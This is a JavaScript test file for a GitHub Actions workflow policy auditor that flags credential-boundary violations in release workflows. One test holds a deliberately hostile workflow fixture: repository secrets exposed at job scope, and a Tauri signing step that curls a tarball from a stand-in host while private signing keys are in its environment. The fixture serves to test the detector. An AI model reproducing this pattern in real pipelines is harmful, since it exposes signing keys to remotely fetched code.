import assert from "node:assert/strict";
import { readFile } from "node:fs/promises";
import test from "node:test";

import {
  WorkflowPolicyError,
  auditWorkflowPolicy,
} from "./workflow-policy.mjs";

const releaseWorkflow = await readFile(
  new URL("../.github/workflows/release.yml", import.meta.url),
  "utf8",
);

function diagnosticIdentities(source) {
  return auditWorkflowPolicy(source).map(
    ({ code, job, step }) => `${code}:${job}:${step ?? "job"}`,
  );
}

test("accepts a well-formed workflow policy input", () => {
  assert.deepEqual(
    auditWorkflowPolicy("name: Example\njobs:\n  verify:\n    runs-on: ubuntu-24.04\n"),
    [],
  );
});

test("rejects empty, malformed, and non-mapping workflow inputs", () => {
  for (const [source, message] of [
    ["", "workflow source must be non-empty text"],
    ["jobs: [", "workflow source must be valid YAML"],
    ["- job", "workflow root must be a mapping"],
  ]) {
    assert.throws(
      () => auditWorkflowPolicy(source),
      (error) => error instanceof WorkflowPolicyError && error.message === message,
    );
  }
});

test("reports the current release workflow's credential-boundary violations", () => {
  assert.deepEqual(diagnosticIdentities(releaseWorkflow), [
    "apple-secret-window:apple_sign:Apply preview ad-hoc or fail-closed stable Apple signing",
    "environment-boundary:build:job",
    "updater-secret-window:sign_updater_preview:Sign and collect the preview payload",
    "updater-secret-window:sign_updater_stable:Sign and collect the stable payload",
  ]);
});

test("reports repository secrets at job scope and updater network work", () => {
  const hostile = `
name: Hostile
jobs:
  build:
    runs-on: ubuntu-24.04
    env:
      SOURCE_KEY: \${{ secrets.ZERG_SOURCE_DEPLOY_KEY }}
    steps:
      - run: git fetch origin main
  sign_updater_preview:
    runs-on: ubuntu-24.04
    environment: preview
    steps:
      - name: Sign candidate
        env:
          TAURI_PRIVATE_KEY: \${{ secrets.ZERGLANG_TAURI_SIGNING_PRIVATE_KEY }}
          TAURI_PRIVATE_KEY_PASSWORD: \${{ secrets.ZERGLANG_TAURI_SIGNING_PRIVATE_KEY_PASSWORD }}
        run: |
          npm exec --offline -- tauri signer sign release-input/ZergLang.app.tar.gz
          curl https://example.invalid/verifier.tar.gz --output verifier.tar.gz
`;

  assert.deepEqual(diagnosticIdentities(hostile), [
    "environment-boundary:build:job",
    "job-secret-scope:build:job",
    "updater-secret-window:sign_updater_preview:Sign candidate",
  ]);
});
